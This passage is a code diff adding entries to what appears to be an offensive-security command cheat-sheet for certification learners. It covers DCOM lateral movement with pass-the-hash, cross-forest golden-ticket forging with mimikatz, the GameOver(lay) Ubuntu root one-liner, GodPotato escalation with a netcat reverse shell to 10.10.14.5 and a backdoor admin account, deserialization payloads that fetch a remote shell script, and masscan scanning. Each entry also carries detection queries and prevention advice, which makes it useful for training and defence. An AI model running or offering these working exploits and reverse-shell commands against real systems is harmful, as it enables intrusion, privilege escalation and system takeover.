+      "notes": "=== BASIC USAGE ===\n  dcomexec.py <domain>/<user>:<pass>@<target>\n  dcomexec.py <domain>/<user>:<pass>@<target> \"whoami\"\n  dcomexec.py <domain>/<user>@<target> -hashes :<nthash>\n\n=== DCOM OBJECTS ===\n  # MMC20.Application (default):\n  dcomexec.py -object MMC20 <domain>/<user>:<pass>@<target>\n  # ShellWindows:\n  dcomexec.py -object ShellWindows <domain>/<user>:<pass>@<target>\n  # ShellBrowserWindow:\n  dcomexec.py -object ShellBrowserWindow <domain>/<user>:<pass>@<target>\n\n=== PASS THE HASH ===\n  dcomexec.py <domain>/<user>@<target> -hashes aad3b435b51404eeaad3b435b51404ee:<nthash>\n\n=== KERBEROS AUTH ===\n  export KRB5CCNAME=ticket.ccache\n  dcomexec.py -k -no-pass <domain>/<user>@<target>\n\n=== COMPARISON: LATERAL MOVEMENT TOOLS ===\n  # psexec.py:    Creates service, writes binary. LOUD. SYSTEM shell.\n  # smbexec.py:   Creates service for each command. Moderate noise.\n  # wmiexec.py:   Uses WMI. Semi-interactive. Moderate detection.\n  # dcomexec.py:  Uses DCOM. No service/binary. Lower detection.\n  # atexec.py:    Uses Task Scheduler. Single command. Moderate.\n  # evil-winrm:   Uses WinRM (port 5985). Interactive. Common.",
+      "examples": [
+        {
+          "label": "Interactive shell via DCOM",
+          "command": "dcomexec.py corp.local/admin:Password123@10.10.10.100"
+        },
+        {
+          "label": "Single command execution",
+          "command": "dcomexec.py corp.local/admin:Password123@10.10.10.100 \"whoami /priv\""
+        },
+        {
+          "label": "Pass-the-hash via DCOM",
+          "command": "dcomexec.py corp.local/admin@10.10.10.100 -hashes :a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4"
+        }
+      ],
+      "references": [
+        {
+          "title": "Impacket",
+          "url": "https://github.com/fortra/impacket"
+        },
+        {
+          "title": "MITRE T1021.003 - DCOM",
+          "url": "https://attack.mitre.org/techniques/T1021/003/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "impacket-exec",
+          "note": "Overview of all Impacket execution tools (psexec, smbexec, wmiexec, atexec).",
+          "rel": "alternative"
+        },
+        {
+          "id": "pth-impacket",
+          "note": "Pass-the-hash with other Impacket tools.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "DCOM objects like MMC20.Application expose ExecuteShellCommand methods that can be called remotely with valid credentials. No service or binary is created on the target.",
+        "prerequisites": "Valid domain credentials with local admin on target; DCOM enabled (default).",
+        "impact": "Remote command execution; interactive shell on the target.",
+        "detection": "[MITRE T1021.003] DCOM object instantiation from remote IP; svchost.exe spawning cmd.exe via DcomLaunch; Event 4624 type 3.",
+        "artifacts": "DCOM-related process creation (mmc.exe, explorer.exe); Event 4624 network logon; child processes from svchost DcomLaunch.",
+        "splunk_spl": "index=windows EventCode=4688 ParentProcessName=\"*svchost.exe*\" (NewProcessName=\"*cmd.exe\" OR NewProcessName=\"*powershell.exe\")\n| where ParentCommandLine=\"*DcomLaunch*\"\n| table _time, SubjectUserName, NewProcessName, CommandLine",
+        "elastic_kql": "process.parent.name:\"svchost.exe\" AND process.parent.args:\"DcomLaunch\" AND process.name:(\"cmd.exe\" OR \"powershell.exe\")",
+        "sentinel_kql": "DeviceProcessEvents\n| where InitiatingProcessFileName == \"svchost.exe\"\n| where InitiatingProcessCommandLine has \"DcomLaunch\"\n| where FileName in (\"cmd.exe\", \"powershell.exe\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+        "sigma_rules": "win_process_creation_dcom_lateral_movement",
+        "prevention": "Disable remote DCOM when not needed; restrict local admin access; monitor DCOM object instantiation; use Windows Firewall to block DCOM ports from untrusted hosts.",
+        "sources": [
+          "Impacket documentation",
+          "https://attack.mitre.org/techniques/T1021/003/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "DCOM lateral movement - DcomLaunch child process",
+            "logic": "DeviceProcessEvents\n| where InitiatingProcessFileName == \"svchost.exe\"\n| where InitiatingProcessCommandLine has \"DcomLaunch\"\n| where FileName in~ (\"cmd.exe\", \"powershell.exe\", \"mmc.exe\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1021.003"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate remote DCOM administration; MMC snap-in usage",
+            "tuning": "Correlate with network logon (4624 type 3) from unusual source IPs"
           }
         ]
       }
@@ -48235,6 +48827,108 @@ const COMMAND_DATA = {
       ]
     },
     {
+      "id": "ad-custom-forest-trust",
+      "name": "Forest Trust Abuse - Cross-Forest Attacks",
+      "command": "Get-ADTrust -Filter * | Select Name, Direction, ForestTransitive, SIDFilteringForestAware, TrustType",
+      "description": "Forest trusts enable access between separate AD forests. If SID Filtering is relaxed (ForestTransitive or SIDFilteringForestAware), cross-forest attacks are possible via SID History injection in golden tickets. Even with SID Filtering, Kerberoasting, password spraying, and shared resource enumeration work across forest boundaries.",
+      "platform": "windows",
+      "type": "attack-chain",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "Trust Abuse",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "CRTP trust abuse module; forest trust escalation",
+      "tags": [
+        "forest-trust",
+        "cross-forest",
+        "sid-filtering",
+        "trust-abuse",
+        "inter-forest",
+        "kerberoast"
+      ],
+      "mitre": [
+        "T1482",
+        "T1134.005"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== ENUMERATE TRUSTS ===\n  Get-ADTrust -Filter * | Select Name, Direction, ForestTransitive, SIDFilteringForestAware, TrustType\n  # Or with PowerView:\n  Get-DomainTrust\n  Get-ForestTrust\n\n=== CROSS-FOREST KERBEROAST ===\n  # Works regardless of SID Filtering:\n  Rubeus.exe kerberoast /domain:<foreign_domain> /dc:<foreign_dc>\n  # Or from Linux:\n  GetUserSPNs.py <foreign_domain>/<user>:<pass> -dc-ip <foreign_dc>\n\n=== CROSS-FOREST GOLDEN TICKET (if SID Filtering disabled) ===\n  # Get inter-realm trust key:\n  mimikatz# lsadump::dcsync /user:<foreign_domain>$\n  # Forge inter-realm TGT with SIDHistory:\n  mimikatz# kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /rc4:<trust_key> /service:krbtgt /target:<foreign_domain> /sids:S-1-5-21-<foreign_sid>-519 /ticket:cross_forest.kirbi\n\n=== SHARED RESOURCES ===\n  # Enumerate shares across trust:\n  Find-DomainShare -CheckShareAccess -Domain <foreign_domain>\n  # Enumerate foreign group members:\n  Get-DomainForeignGroupMember -Domain <foreign_domain>\n  # Find users with access across trust:\n  Get-DomainForeignUser -Domain <foreign_domain>\n\n=== SID FILTERING CHECK ===\n  netdom trust <domain> /d:<foreign_domain> /quarantine\n  # Or: nltest /domain_trusts /v",
+      "examples": [
+        {
+          "label": "Enumerate forest trusts",
+          "command": "Get-ADTrust -Filter * | Select Name, Direction, ForestTransitive, SIDFilteringForestAware, TrustType"
+        },
+        {
+          "label": "Cross-forest Kerberoast",
+          "command": "Rubeus.exe kerberoast /domain:partner.com /dc:dc01.partner.com"
+        },
+        {
+          "label": "Find shared resources across trust",
+          "command": "Find-DomainShare -CheckShareAccess -Domain partner.com"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1482 - Domain Trust Discovery",
+          "url": "https://attack.mitre.org/techniques/T1482/"
+        },
+        {
+          "title": "ADSecurity - Trust Abuse",
+          "url": "https://adsecurity.org/?p=282"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-sid-history-persistence",
+          "note": "SID History injection in golden tickets for cross-forest escalation.",
+          "rel": "next"
+        },
+        {
+          "id": "crtp-golden-ticket",
+          "note": "Golden Ticket with extra SIDs for cross-forest access.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Forest trusts create authentication pathways between forests. SID Filtering is the primary defense, but when disabled (ForestTransitive trusts), cross-forest SID injection in Kerberos tickets grants privileges in the trusted forest.",
+        "prerequisites": "Domain Admin in one forest; forest trust relationship; SID Filtering disabled for full compromise (Kerberoast works regardless).",
+        "impact": "Cross-forest privilege escalation; compromise of the trusted forest from the trusting forest.",
+        "detection": "[MITRE T1482] Trust enumeration commands; cross-forest authentication events; SID History in cross-forest tickets.",
+        "artifacts": "Event 4769 (TGS) with cross-forest service names; nltest/netdom in command history; Event 4624 from foreign forest.",
+        "splunk_spl": "index=windows EventCode=4769 ServiceName=\"krbtgt/*\"\n| where ServiceName!=(\"krbtgt/\" + TargetDomainName)\n| table _time, TargetUserName, ServiceName, IpAddress",
+        "elastic_kql": "event.code:\"4769\" AND service.name:krbtgt*",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4769\n| where ServiceName startswith \"krbtgt/\" and ServiceName !has TargetDomainName\n| project TimeGenerated, TargetUserName, ServiceName, IpAddress",
+        "sigma_rules": "win_security_cross_forest_trust_abuse",
+        "prevention": "Enable SID Filtering on all forest trusts; use Selective Authentication; minimize cross-forest trust relationships; audit inter-forest access regularly.",
+        "sources": [
+          "CRTP trust module",
+          "https://attack.mitre.org/techniques/T1482/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Cross-forest Kerberos authentication",
+            "logic": "SecurityEvent\n| where EventID == 4769\n| where ServiceName startswith \"krbtgt/\"\n| extend TargetForest = extract(@\"krbtgt/(.*)\", 1, ServiceName)\n| where TargetForest != \"\" and TargetForest != TargetDomainName\n| project TimeGenerated, TargetUserName, ServiceName, TargetForest, IpAddress",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4769"
+            ],
+            "attack": [
+              "T1482",
+              "T1134.005"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate cross-forest resource access; multi-forest environments",
+            "tuning": "Baseline normal cross-forest authentication; alert on unusual users or volumes"
+          }
+        ]
+      }
+    },
+    {
       "id": "crtp-forest-trust-abuse",
       "name": "Forest Trust Abuse (Inter-Realm TGT Forgery)",
       "command": "Rubeus.exe golden /rc4:<nt_hash> /domain:<domain> /sid:<domain_sid> /sids:<target_enterprise_admin_sid> /user:Administrator /service:krbtgt /target:<target_domain> /ptt",
@@ -49577,6 +50271,100 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Enumerates an FTP service interactively:\n  ftp <ip>   open a session and try anonymous login\nOnce in, ls/ls -R to browse, get/put to test read/write, and 'status' for TLS/mode info; the card also shows raw banner grabbing with nc/telnet and TLS interaction via openssl s_client -starttls ftp."
+    },
+    {
+      "id": "linux-gameoverlay",
+      "name": "GameOver(lay) (CVE-2023-2640/CVE-2023-32629) - Ubuntu OverlayFS Privesc",
+      "command": "unshare -rm sh -c \"mkdir l u w m && cp /u*/b*/p]asswd l/; setcap cap_setuid+eip l/passwd; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;\" && u/passwd",
+      "description": "GameOver(lay) exploits Ubuntu-specific patches to OverlayFS (CVE-2023-2640 and CVE-2023-32629) that allow setting privileged extended attributes on files in an overlay filesystem from an unprivileged user namespace. This one-liner grants root on most Ubuntu kernels from 2023. Extremely easy to exploit - just paste and run.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Post-Exploitation",
+      "subcategory": "Privilege Escalation",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "CVE-2023-2640/CVE-2023-32629; Wiz.io discovery",
+      "tags": [
+        "gameoverlay",
+        "cve-2023-2640",
+        "cve-2023-32629",
+        "overlayfs",
+        "ubuntu",
+        "user-namespace",
+        "capabilities"
+      ],
+      "mitre": [
+        "T1068"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== AFFECTED ===\nUbuntu kernels with OverlayFS patches:\n- Ubuntu 23.04 (Lunar) - kernel 6.2\n- Ubuntu 22.10 (Kinetic) - kernel 5.19\n- Ubuntu 22.04 (Jammy) - kernel 5.15-5.19\n- Ubuntu 20.04 (Focal) - kernel 5.4 (some versions)\nNOT affected: non-Ubuntu distros (they dont have the vuln patches)\n\n=== ONE-LINER EXPLOIT ===\n  unshare -rm sh -c \"mkdir l u w m && cp /u*/b*/p]asswd l/; setcap cap_setuid+eip l/passwd; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;\" && u/passwd\n  # Instant root!\n\n=== HOW IT WORKS ===\n1. unshare -rm creates a user namespace with root inside\n2. Copies /usr/bin/passwd and sets cap_setuid capability\n3. Mounts an overlay filesystem\n4. The overlay trigger copies the capability to the upper dir\n5. The capability persists after leaving the namespace\n6. Running the capable binary grants root\n\n=== CHECK ===\n  uname -r   # Check kernel version\n  cat /etc/os-release  # Confirm Ubuntu",
+      "examples": [
+        {
+          "label": "One-liner root exploit",
+          "command": "unshare -rm sh -c \"mkdir l u w m && cp /u*/b*/p]asswd l/; setcap cap_setuid+eip l/passwd; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;\" && u/passwd"
+        },
+        {
+          "label": "Check if Ubuntu kernel is affected",
+          "command": "uname -r && cat /etc/os-release | grep -i ubuntu"
+        }
+      ],
+      "references": [
+        {
+          "title": "Wiz.io - GameOver(lay)",
+          "url": "https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability"
+        },
+        {
+          "title": "CVE-2023-2640",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-2640"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "linux-exploit-suggester",
+          "note": "LES identifies GameOverlay among other kernel privesc CVEs.",
+          "rel": "prereq"
+        },
+        {
+          "id": "dirty-pipe",
+          "note": "DirtyPipe for kernel 5.8+; GameOverlay for Ubuntu specifically.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Ubuntu-specific OverlayFS patches allowed privileged file capabilities to be set from within unprivileged user namespaces. The capabilities persist on the upper directory files after the overlay is unmounted.",
+        "prerequisites": "Ubuntu system with vulnerable kernel; user namespaces enabled (default).",
+        "impact": "Instant root from any unprivileged user; trivial one-liner exploitation.",
+        "detection": "[MITRE T1068] unshare with overlay mount; setcap in user namespace; file capability changes.",
+        "artifacts": "Process tree showing unshare -rm; overlay mount events; capability changes on binaries.",
+        "splunk_spl": "index=linux sourcetype=syslog (\"unshare\" AND \"overlay\") OR (\"setcap\" AND \"cap_setuid\")\n| table _time, host, process, message",
+        "elastic_kql": "process.name:\"unshare\" AND process.args:(\"-rm\" OR \"overlay\")",
+        "sentinel_kql": "Syslog\n| where SyslogMessage has \"unshare\" and SyslogMessage has \"overlay\"\n| project TimeGenerated, HostName, SyslogMessage",
+        "sigma_rules": "linux_gameoverlay_cve_2023_2640",
+        "prevention": "Apply Ubuntu kernel updates; disable user namespaces if not needed (sysctl kernel.unprivileged_userns_clone=0); monitor for overlay mount abuse.",
+        "sources": [
+          "CVE-2023-2640",
+          "https://attack.mitre.org/techniques/T1068/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "GameOverlay OverlayFS privilege escalation",
+            "logic": "title: GameOverlay Ubuntu OverlayFS Privesc\nstatus: experimental\nlogsource:\n  product: linux\n  category: process_creation\ndetection:\n  selection:\n    Image|endswith: /unshare\n    CommandLine|contains:\n      - \"-rm\"\n      - \"overlay\"\n  condition: selection\nlevel: critical",
+            "data_source": "linux-audit",
+            "attack": [
+              "T1068"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Container runtimes using user namespaces; legitimate overlay mount operations",
+            "tuning": "Alert on non-container unshare with overlay; correlate with setcap events"
+          }
+        ]
+      }
     },
     {
       "id": "gcp-authentication",
@@ -52745,6 +53533,104 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Brute-forces hidden web content with gobuster:\n  gobuster dir   directory/file brute-force mode\n  -u http://<ip>/   the target base URL\n  -w <wordlist>     the wordlist of paths to try\nFinds unlinked directories and files the site does not advertise; 'gobuster dns -d <domain> -w <list>' does the same for subdomains, and -x adds file extensions."
+    },
+    {
+      "id": "privesc-godpotato",
+      "name": "GodPotato - Universal Windows Potato Privilege Escalation",
+      "command": "GodPotato.exe -cmd \"cmd /c whoami\"",
+      "description": "GodPotato works on Windows Server 2012-2022 and Windows 8-11 by exploiting DCOM/RPCSS to escalate from service accounts with SeImpersonatePrivilege to SYSTEM. Unlike older potatoes, it does not rely on specific Windows versions or BITS/PrintSpooler. The most reliable current potato for modern Windows.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Post-Exploitation",
+      "subcategory": "Privilege Escalation",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "BeichenDream/GodPotato",
+      "tags": [
+        "godpotato",
+        "potato",
+        "seimpersonate",
+        "privesc",
+        "dcom",
+        "system",
+        "service-account"
+      ],
+      "mitre": [
+        "T1134.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHEN TO USE ===\nYou have a shell as a service account with SeImpersonatePrivilege:\n  whoami /priv\n  # Look for: SeImpersonatePrivilege - Enabled\n  # Common accounts: IIS AppPool, MSSQL, service accounts\n\n=== BASIC USAGE ===\n  GodPotato.exe -cmd \"cmd /c whoami\"\n  # Output: nt authority\\system\n\n=== REVERSE SHELL ===\n  GodPotato.exe -cmd \"cmd /c powershell -e <base64_payload>\"\n  # Or:\n  GodPotato.exe -cmd \"cmd /c C:\\temp\\nc.exe <ip> <port> -e cmd.exe\"\n\n=== ADD ADMIN USER ===\n  GodPotato.exe -cmd \"net user hacker Password123! /add\"\n  GodPotato.exe -cmd \"net localgroup administrators hacker /add\"\n\n=== POTATO FAMILY ===\n- GodPotato: Works on all modern Windows (2012-2022, 8-11)\n- PrintSpoofer: Uses print spooler (may be disabled)\n- JuicyPotato: Windows Server 2016/2019 (needs CLSID)\n- SweetPotato: Combines multiple techniques\n- RoguePotato: Needs outbound TCP\n- All require SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege",
+      "examples": [
+        {
+          "label": "Execute command as SYSTEM",
+          "command": "GodPotato.exe -cmd \"cmd /c whoami\""
+        },
+        {
+          "label": "Reverse shell as SYSTEM",
+          "command": "GodPotato.exe -cmd \"cmd /c C:\\temp\\nc.exe 10.10.14.5 4444 -e cmd.exe\""
+        },
+        {
+          "label": "Check for SeImpersonatePrivilege",
+          "command": "whoami /priv | findstr Impersonate"
+        }
+      ],
+      "references": [
+        {
+          "title": "GodPotato",
+          "url": "https://github.com/BeichenDream/GodPotato"
+        },
+        {
+          "title": "MITRE T1134.001",
+          "url": "https://attack.mitre.org/techniques/T1134/001/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "seimpersonate-printspoofer",
+          "note": "PrintSpoofer alternative when print spooler is running.",
+          "rel": "alternative"
+        },
+        {
+          "id": "seimpersonate-juicypotato",
+          "note": "JuicyPotato for older Windows Server versions.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "GodPotato abuses DCOM/RPCSS to negotiate authentication and impersonate SYSTEM. The SeImpersonatePrivilege token allows the service account to assume any token presented to it.",
+        "prerequisites": "Service account with SeImpersonatePrivilege; GodPotato binary on target.",
+        "impact": "SYSTEM-level code execution from a service account.",
+        "detection": "[MITRE T1134.001] GodPotato process creation; token manipulation events; new process spawned as SYSTEM from service context.",
+        "artifacts": "GodPotato.exe on disk; process creation under service account spawning SYSTEM child; Event 4688 with token elevation.",
+        "splunk_spl": "index=windows EventCode=4688 (NewProcessName=\"*GodPotato*\" OR NewProcessName=\"*potato*\")\n| table _time, SubjectUserName, NewProcessName, CommandLine",
+        "elastic_kql": "process.name:(*GodPotato* OR *potato*) AND process.args:(\"-cmd\")",
+        "sentinel_kql": "DeviceProcessEvents\n| where FileName has_any (\"GodPotato\", \"SweetPotato\", \"JuicyPotato\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+        "sigma_rules": "win_process_creation_potato_privesc",
+        "prevention": "Remove SeImpersonatePrivilege from unnecessary service accounts; use Group Managed Service Accounts; monitor for potato tool signatures.",
+        "sources": [
+          "BeichenDream research",
+          "https://attack.mitre.org/techniques/T1134/001/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Potato privilege escalation tool execution",
+            "logic": "DeviceProcessEvents\n| where FileName has_any (\"GodPotato\", \"SweetPotato\", \"JuicyPotato\", \"RoguePotato\", \"PrintSpoofer\")\n  or ProcessCommandLine has_any (\"GodPotato\", \"-cmd\", \"SweetPotato\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1134.001"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Renamed binaries will evade filename-based detection",
+            "tuning": "Also monitor for SeImpersonatePrivilege abuse patterns and unexpected SYSTEM child processes from service accounts"
+          }
+        ]
+      }
     },
     {
       "id": "crtp-golden-ticket",
@@ -64572,6 +65458,100 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "explain": "Cross-injection reference mapping each injection class to the characters that trigger it - useful when fuzzing an unknown input to decide which injection to pursue.\nA single fuzz payload combining these characters helps classify the vulnerability quickly."
+    },
+    {
+      "id": "exploit-deserialization",
+      "name": "Insecure Deserialization - RCE via Object Injection",
+      "command": "ysoserial.exe -g <gadget_chain> -f <formatter> -c \"<command>\" -o raw > payload.bin",
+      "description": "Insecure deserialization allows attackers to inject malicious serialized objects that execute code when deserialized. Affects Java (ysoserial), .NET (ysoserial.net), PHP (phpggc), Python (pickle), and Node.js. Consistently in the OWASP Top 10 and extremely common in enterprise applications.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Web Exploitation",
+      "subcategory": "Deserialization",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "OWASP Top 10; ysoserial; phpggc",
+      "tags": [
+        "deserialization",
+        "ysoserial",
+        "phpggc",
+        "rce",
+        "java",
+        "dotnet",
+        "pickle",
+        "owasp"
+      ],
+      "mitre": [
+        "T1059"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== JAVA (ysoserial) ===\n  # Generate payload:\n  java -jar ysoserial.jar CommonsCollections1 \"ping <ip>\" > payload.bin\n  java -jar ysoserial.jar CommonsCollections6 \"wget http://<ip>/shell.sh -O /tmp/shell.sh\" > payload.bin\n  # Common gadget chains:\n  # CommonsCollections1-7, Spring1-2, Groovy1, JBossInterceptors1\n  # Base64 for web injection:\n  java -jar ysoserial.jar CommonsCollections1 \"id\" | base64 -w0\n\n=== .NET (ysoserial.net) ===\n  ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c \"calc\" -o raw\n  ysoserial.exe -g WindowsIdentity -f Json.Net -c \"cmd /c whoami > C:\\temp\\out.txt\"\n  # Common formatters: BinaryFormatter, ObjectStateFormatter, Json.Net, DataContractSerializer\n  # ViewState deserialization:\n  ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"cmd /c whoami\"\n\n=== PHP (phpggc) ===\n  phpggc Laravel/RCE1 system id\n  phpggc Symfony/RCE4 exec \"id\"\n  phpggc Monolog/RCE1 exec \"whoami\"\n  # List available chains:\n  phpggc -l\n\n=== PYTHON (pickle) ===\n  import pickle, os\n  class RCE:\n      def __reduce__(self):\n          return (os.system, (\"id\",))\n  pickle.dumps(RCE())\n\n=== IDENTIFICATION ===\n- Java: rO0AB (base64) or AC ED 00 05 (hex) = Java serialized object\n- .NET: AAEAAAD (base64) = BinaryFormatter\n- PHP: O:4:\"User\" or a:2:{} = PHP serialized\n- Python: base64 with gASV or \\x80\\x04\\x95 = pickle",
+      "examples": [
+        {
+          "label": "Java ysoserial payload",
+          "command": "java -jar ysoserial.jar CommonsCollections1 \"ping 10.10.14.5\" | base64 -w0"
+        },
+        {
+          "label": ".NET ysoserial payload",
+          "command": "ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c \"calc\" -o raw"
+        },
+        {
+          "label": "PHP phpggc payload",
+          "command": "phpggc Laravel/RCE1 system id"
+        }
+      ],
+      "references": [
+        {
+          "title": "OWASP - Insecure Deserialization",
+          "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests"
+        },
+        {
+          "title": "ysoserial",
+          "url": "https://github.com/frohoff/ysoserial"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "web-dalfox-xss",
+          "note": "Different injection vector; deserialization attacks backend processing.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Applications that deserialize untrusted data allow attackers to control object state. Gadget chains within application dependencies provide code execution paths triggered during deserialization.",
+        "prerequisites": "Application deserializes user-controlled input; vulnerable library/gadget chain in classpath.",
+        "impact": "Remote code execution on the application server.",
+        "detection": "[MITRE T1059] Unusual process spawning from web application; Java/PHP/Python process executing system commands.",
+        "artifacts": "Web logs with serialized payloads (base64 encoded); child processes from web server; ysoserial signatures.",
+        "splunk_spl": "index=web (uri_query=\"*rO0AB*\" OR uri_query=\"*AAEAAAD*\" OR request_body=\"*O:*:{*\")\n| table _time, src_ip, uri_path, uri_query",
+        "elastic_kql": "http.request.body.content:(*rO0AB* OR *AAEAAAD* OR *phpggc*)",
+        "sentinel_kql": "W3CIISLog\n| where csUriQuery has_any (\"rO0AB\", \"AAEAAAD\") or csUriQuery matches regex @\"O:\\d+:\"\n| project TimeGenerated, cIP, csUriStem, csUriQuery",
+        "sigma_rules": "web_deserialization_payload_detection",
+        "prevention": "Never deserialize untrusted data; use allowlists for deserialization classes; keep libraries updated; use language-native formats (JSON) instead of object serialization.",
+        "sources": [
+          "OWASP Top 10",
+          "https://attack.mitre.org/techniques/T1059/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Serialized payload in web request",
+            "logic": "W3CIISLog\n| where csUriQuery has_any (\"rO0AB\", \"AAEAAAD\", \"aced0005\")\n  or csUriQuery matches regex @\"O:\\d+:\\\"[A-Za-z]\"\n| project TimeGenerated, cIP, csUriStem, csUriQuery, scStatus",
+            "data_source": "iis",
+            "attack": [
+              "T1059"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Legitimate serialized API data; base64-encoded parameters that coincidentally match signatures",
+            "tuning": "Focus on endpoints that accept serialized input; correlate with process creation from web server"
+          }
+        ]
+      }
     },
     {
       "type": "command",
@@ -81359,6 +82339,103 @@ const COMMAND_DATA = {
         "sigma"
       ],
       "explain": "Introduction to malware analysis for SOC analysts.\nMalware types: virus, worm, trojan, ransomware, spyware, adware, botnet, rootkit, backdoor/RAT, dropper, infostealer.\n=== MALWARE TYPES ===\nVirus: attaches to host files, spreads on execution\nWorm: self-replicates across networks without user interaction\nTrojan: disguised as legit software, creates backdoors\nRanso..."
+    },
+    {
+      "id": "recon-masscan",
+      "name": "Masscan - Fastest Internet-Scale Port Scanner",
+      "command": "masscan -p1-65535 <target> --rate=1000 -oG masscan_output.gnmap",
+      "description": "Masscan scans the entire internet in under 6 minutes at 10M packets/second. Uses its own custom TCP/IP stack for asynchronous scanning - does not use the OS network stack. Ideal for quickly identifying open ports across large ranges before detailed nmap scanning.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Reconnaissance",
+      "subcategory": "Port Scanning",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "Robert David Graham; masscan",
+      "tags": [
+        "masscan",
+        "port-scan",
+        "fast-scan",
+        "tcp-syn",
+        "recon",
+        "network-scan"
+      ],
+      "mitre": [
+        "T1046"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  apt install masscan\n  # Or build from source for latest\n\n=== BASIC SCANS ===\n  # All ports, moderate rate:\n  masscan -p1-65535 <target> --rate=1000\n  # Top ports:\n  masscan -p80,443,8080,21,22,25,53,110,445,3389 <target> --rate=500\n  # UDP ports:\n  masscan -pU:53,161,500 <target> --rate=500\n\n=== OUTPUT FORMATS ===\n  masscan -p1-65535 <target> --rate=1000 -oG output.gnmap  # Greppable\n  masscan -p1-65535 <target> --rate=1000 -oX output.xml    # XML\n  masscan -p1-65535 <target> --rate=1000 -oL output.list   # List\n  masscan -p1-65535 <target> --rate=1000 -oJ output.json   # JSON\n\n=== PIPE TO NMAP ===\n  # Masscan for speed, nmap for detail:\n  masscan -p1-65535 <target> --rate=1000 -oG masscan.gnmap\n  grep open masscan.gnmap | awk -F/ \"{print \\$1}\" | sort -u > ports.txt\n  nmap -sC -sV -p$(cat ports.txt | tr \"\\n\" \",\") <target>\n\n=== RATE CONTROL ===\n  --rate=100    # Quiet, slow\n  --rate=1000   # Normal pentest\n  --rate=10000  # Fast, may miss some\n  --rate=100000 # Very fast, needs good NIC\n\n=== SUBNET SCANNING ===\n  masscan -p80,443 10.10.10.0/24 --rate=500\n  masscan -p445 172.16.0.0/16 --rate=1000 --excludefile exclude.txt",
+      "examples": [
+        {
+          "label": "Full port scan",
+          "command": "masscan -p1-65535 10.10.10.100 --rate=1000 -oG masscan.gnmap"
+        },
+        {
+          "label": "Quick common ports",
+          "command": "masscan -p80,443,445,22,21,3389,8080 10.10.10.0/24 --rate=500"
+        },
+        {
+          "label": "UDP scan",
+          "command": "masscan -pU:53,161,500,1434 10.10.10.100 --rate=500"
+        }
+      ],
+      "references": [
+        {
+          "title": "Masscan - GitHub",
+          "url": "https://github.com/robertdavidgraham/masscan"
+        },
+        {
+          "title": "MITRE T1046 - Network Service Scanning",
+          "url": "https://attack.mitre.org/techniques/T1046/"
+        }
